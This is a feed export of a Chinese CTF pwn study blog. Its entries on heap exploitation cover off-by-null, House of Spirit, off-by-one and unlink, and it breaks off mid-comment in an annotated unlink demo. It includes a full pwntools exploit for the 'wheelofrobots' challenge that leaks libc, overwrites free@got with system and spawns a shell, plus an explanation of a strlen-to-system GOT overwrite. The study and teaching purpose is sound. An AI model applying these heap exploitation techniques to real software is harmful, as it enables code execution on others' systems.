“c”)，意思就是bbbb这四个字符在左边固定，然后如果长度不够8，那就在右边补指定字符，这里就是c，直到够8个。这里是为了照顾里面的那个cut_enter的把，如果输入不影响，那就说明他写的exp比较随意。</p></blockquote><p>6、为什么要把system地址覆盖至strlen_got处，然后再在后面接上’;/bin/sh\x00’，为什么这样就可以成功getshell了。</p><blockquote><p>考虑一下在调用message的时候，先改了strlen为system地址，然后在cut那里调用了strlen，但处理的参数是输入的那串payload，相当于执行了system(p64(system)+”;/bin/sh”)，分号的意思就是，前面执行完执行后面的这条，所以虽然执行前面一定会出错，不过无所谓，后面就相当于system(“/bin/sh\x00”)了，这样就可以getshell了。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> 做题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off by null</title>
      <link href="/2020/03/11/off-by-null/"/>
      <url>/2020/03/11/off-by-null/</url>
      
        <content type="html"><![CDATA[<h3 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h3><p>会溢出一个空字节(\x00)到堆空间中的Off-By-One漏洞</p><p><a href="https://www.cnblogs.com/pfcode/p/10991699.html" target="_blank" rel="noopener">https://www.cnblogs.com/pfcode/p/10991699.html</a></p><h3 id="详细的利用过程"><a href="#详细的利用过程" class="headerlink" title="详细的利用过程"></a>详细的利用过程</h3><p><img src="01.png" alt="01"></p><p><img src="02.jpg" alt="02"></p><p><img src="03.jpg" alt="03"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> off by null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做题记录_20200310</title>
      <link href="/2020/03/10/zuo-ti-ji-lu-20200310/"/>
      <url>/2020/03/10/zuo-ti-ji-lu-20200310/</url>
      
        <content type="html"><![CDATA[<h3 id="attribute-aligned-n"><a href="#attribute-aligned-n" class="headerlink" title="_attribute_((aligned(n)))"></a>_<em>attribute_</em>((aligned(n)))</h3><p><a href="https://blog.csdn.net/fengbingchun/article/details/81321419" target="_blank" rel="noopener">https://blog.csdn.net/fengbingchun/article/details/81321419</a></p><h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><p><a href="https://xz.aliyun.com/t/7267#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/7267#toc-11</a></p><h3 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h3><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">https://blog.csdn.net/nibiru_holmes/article/details/62040763</a> （讲解了多种类型的Off-By-One漏洞）</p><p><a href="https://segmentfault.com/a/1190000020437770?utm_source=tag-newest" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020437770?utm_source=tag-newest</a></p><p><a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">https://blog.csdn.net/qq_40934487/article/details/91465347</a></p><p><strong>疑问</strong></p><p>这两个教程使用了同一个例题，但是有个地方没有看懂</p><p>首先定义了一个结构体book</p><pre class="line-numbers language-C"><code class="language-C">struct book{    int id;    char *name;    char *description;    int size;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后</p><pre class="line-numbers language-C"><code class="language-C">book = malloc(0x20uLL);if ( book ){    *((_DWORD *)book + 6) = size;    *((_QWORD *)off_202010 + v2) = book;    *((_QWORD *)book + 2) = description;    *((_QWORD *)book + 1) = name;    *(_DWORD *)book = ++unk_202024;    return 0LL;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出堆中存储的是结构体book（同时这个指针也叫book）</p><p>总共5条语句（return除外），后三条没有疑问，但是前两条不懂</p><p>1、根据结构体book的构造，book+3处存放size，但是这里是book+6</p><p>2、off_202010和v2分别是什么？</p><h3 id="解答1："><a href="#解答1：" class="headerlink" title="解答1："></a>解答1：</h3><p>注意这里是dword，第2、3、4条语句是qword，dword为4字节，qword为8字节，所以变成了book+6</p><p><a href="https://www.anquanke.com/post/id/88961" target="_blank" rel="noopener">https://www.anquanke.com/post/id/88961</a></p><p><strong>疑问</strong></p><p>这个教程使用了另一个例题，但是堆的结构没看懂</p><h3 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h3><p>这道题暂时放着</p><p>ctfwiki上的exp：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'DEBUG'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./wheelofrobots"</span>robots <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./wheelofrobots'</span><span class="token punctuation">)</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./wheelofrobots"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'PID: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">offset_bin_main_arena</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    word_bytes <span class="token operator">=</span> context<span class="token punctuation">.</span>word_size <span class="token operator">/</span> <span class="token number">8</span>    offset <span class="token operator">=</span> <span class="token number">4</span>  <span class="token comment" spellcheck="true"># lock</span>    offset <span class="token operator">+=</span> <span class="token number">4</span>  <span class="token comment" spellcheck="true"># flags</span>    offset <span class="token operator">+=</span> word_bytes <span class="token operator">*</span> <span class="token number">10</span>  <span class="token comment" spellcheck="true"># offset fastbin</span>    offset <span class="token operator">+=</span> word_bytes <span class="token operator">*</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true"># top,last_remainder</span>    offset <span class="token operator">+=</span> idx <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">*</span> word_bytes  <span class="token comment" spellcheck="true"># idx</span>    offset <span class="token operator">-=</span> word_bytes <span class="token operator">*</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true"># bin overlap</span>    <span class="token keyword">return</span> offset<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> idx <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Increase Bender's intelligence: "</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> idx <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Increase Robot Devil's cruelty: "</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> idx <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Increase Destructor's powerful: "</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Robot's name: \n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start_robot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">overflow_benderinuse</span><span class="token punctuation">(</span>inuse<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'9999'</span> <span class="token operator">+</span> inuse<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>where<span class="token punctuation">,</span> what<span class="token punctuation">)</span><span class="token punctuation">:</span>    change<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>where<span class="token punctuation">)</span><span class="token punctuation">)</span>    change<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>what<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"step 1"</span>    <span class="token comment" spellcheck="true"># add a fastbin chunk 0x20 and free it</span>    <span class="token comment" spellcheck="true"># so it is in fastbin, idx2->NULL</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># idx2</span>    remove<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># overflow bender inuse with 1</span>    overflow_benderinuse<span class="token punctuation">(</span><span class="token string">'\x01'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># change bender's fd to 0x603138, point to bender's size</span>    <span class="token comment" spellcheck="true"># now fastbin 0x20, idx2->0x603138->NULL</span>    change<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x603138</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># in order add bender again</span>    overflow_benderinuse<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># add bender again, fastbin 0x603138->NULL</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># in order to malloc chunk at 0x603138</span>    <span class="token comment" spellcheck="true"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span>    <span class="token comment" spellcheck="true"># it is at Robot Devil</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># trigger malloc, set tinny point to 0x603148</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># wheels must &lt;= 3</span>    remove<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    remove<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 2'</span>    <span class="token comment" spellcheck="true"># alloc Destructor size 60->0x50, chunk content 0x40</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># alloc devil, size=20*7=140, bigger than fastbin</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># edit destructor's size to 1000 by tinny</span>    change<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># place fake chunk at destructor's pointer</span>    fakechunk_addr <span class="token operator">=</span> <span class="token number">0x6030E8</span>    fakechunk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fakechunk_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>        fakechunk_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    fakechunk <span class="token operator">=</span> fakechunk<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    fakechunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>    change<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> fakechunk<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># trigger unlink</span>    remove<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 3'</span>    <span class="token comment" spellcheck="true"># make 0x6030F8 point to 0x6030E8</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6030E8</span><span class="token punctuation">)</span>    change<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 4'</span>    <span class="token comment" spellcheck="true"># make exit just as return</span>    write<span class="token punctuation">(</span>robots<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x401954</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 5'</span>    <span class="token comment" spellcheck="true"># set wheel cnt =3, 0x603130 in order to start robot</span>    write<span class="token punctuation">(</span><span class="token number">0x603130</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># set destructor point to puts@got</span>    change<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>robots<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    start_robot<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'New hands great!! Thx '</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># make free->system</span>    write<span class="token punctuation">(</span>robots<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># make destructor point to /bin/sh addr</span>    write<span class="token punctuation">(</span><span class="token number">0x6030E8</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get shell</span>    remove<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> house of spirit </tag>
            
            <tag> 做题记录 </tag>
            
            <tag> off by one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of spirit</title>
      <link href="/2020/03/10/house-of-spirit/"/>
      <url>/2020/03/10/house-of-spirit/</url>
      
        <content type="html"><![CDATA[<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><p><a href="https://xz.aliyun.com/t/7267#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/7267#toc-11</a></p><p>伪造一个chunk（可以在栈上），然后将其free掉，再次malloc时就可以返回这个假堆块</p><p>个人感觉和fastbin attack有些相似</p><p>可以进行任意地址写</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> house of spirit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2020/03/06/unlink/"/>
      <url>/2020/03/06/unlink/</url>
      
        <content type="html"><![CDATA[<h3 id="unlink的利用"><a href="#unlink的利用" class="headerlink" title="unlink的利用"></a>unlink的利用</h3><p><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><p><a href="https://blog.csdn.net/qq_25201379/article/details/81545128" target="_blank" rel="noopener">https://blog.csdn.net/qq_25201379/article/details/81545128</a></p><p><a href="https://www.cnblogs.com/Magpie/p/9705942.html" target="_blank" rel="noopener">https://www.cnblogs.com/Magpie/p/9705942.html</a></p><h3 id="疑问："><a href="#疑问：" class="headerlink" title="疑问："></a>疑问：</h3><p>1、p到底是堆块开头的地址还是用户数据开头的地址？（即是prev_size处还是fd处）</p><p>2、到底是如何绕过检测的？正常情况下，Fd=p-&gt;fd，FD应该等于p-&gt;fd处存放的地址（BK同），那么FD-&gt;bk处也是存放着一个地址，这个地址就是p的地址（BK-&gt;fd同）。但是按照教程中的绕过方法，FD-&gt;bk处就是p处，存放的是prev_size而不是p的地址（BK-&gt;fd同）。</p><h3 id="解答2："><a href="#解答2：" class="headerlink" title="解答2："></a>解答2：</h3><p>教程中没有写清楚，应该是：</p><pre class="line-numbers language-C"><code class="language-C">fd = &ptr - 0x18bk = &ptr - 0x10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中ptr存放p的地址</p><h3 id="解答1："><a href="#解答1：" class="headerlink" title="解答1："></a>解答1：</h3><p>在chunk的用户数据处构造了一个fake chunk，p既是chunk用户数据的开头地址，也是fake chunk的堆块开头地址</p><h3 id="自己写的讲解"><a href="#自己写的讲解" class="headerlink" title="自己写的讲解"></a>自己写的讲解</h3><p>网上的教程讲的不够清楚（至少对于我来说是这样），how2heap中的程序讲的比较清晰。</p><p>这里以网上的一个教程中的程序为例，自己来分析一遍</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>    uint64_t<span class="token operator">*</span> ptr0 <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t<span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//这里申请了两个堆块，并且声明了两个指针分别指向它们</span>    <span class="token comment" spellcheck="true">//注意，这两个指针本身位于栈上，而存储的内容则是堆上的地址——分别指向两个堆块的数据段</span>    ptr0<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token operator">&amp;</span>ptr0 <span class="token operator">-</span> <span class="token number">3</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token operator">&amp;</span>ptr0 <span class="token operator">-</span> <span class="token number">2</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//在堆块0中构造一个fake chunk，给这个fake chunk的fd和bk分别赋值为&amp;ptr0-3和&amp;ptr0-2</span>    <span class="token comment" spellcheck="true">//注意，这里的&amp;ptr0-3和&amp;ptr0-2都是栈上的地址</span>    <span class="token comment" spellcheck="true">//在进行检验时，p->fd地址为ptr0[2]，存储的值为&amp;ptr0-3</span>    <span class="token comment" spellcheck="true">//p->fd->bk地址为&amp;ptr0-3+3，即&amp;ptr0</span>    <span class="token comment" spellcheck="true">//ptr0中存储的值为堆块0的数据段首地址，同时也是fake chunk的首地址，因此p->bk->fd==p成立</span>    uint64_t<span class="token operator">*</span> ptr1_head <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>ptr1 <span class="token operator">-</span> <span class="token number">2</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1_head<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span>    ptr1_head<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//伪造堆块1的head，使prev_size为fake chunk的大小，size的P位为0</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//触发unlink，unlink的过程如下：</span>    <span class="token comment" spellcheck="true">//FD = p->fd;</span>    <span class="token comment" spellcheck="true">//BK = p->bk;</span>    <span class="token comment" spellcheck="true">//FD->bk = BK;</span>    <span class="token comment" spellcheck="true">//BK->fd = FD;</span>    <span class="token comment" 